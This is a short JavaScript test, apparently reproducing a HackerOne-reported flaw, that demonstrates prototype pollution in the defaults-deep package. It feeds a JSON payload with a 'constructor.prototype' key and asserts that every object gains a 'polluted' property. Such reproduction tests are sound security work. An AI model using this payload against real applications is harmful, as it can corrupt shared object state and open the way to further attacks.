//https://hackerone.com/reports/380878
test("prototype pollution in defaults-deep ", () => {
  const defaultsDeep = require("defaults-deep");

  let obj = {};

  expect({}.polluted).toBe(undefined);

  let payload = JSON.parse(
    '{"constructor": {"prototype": {"polluted": "yes"}}}'
  );
  defaultsDeep({}, payload);
  expect({}.polluted).toBe("yes");
});
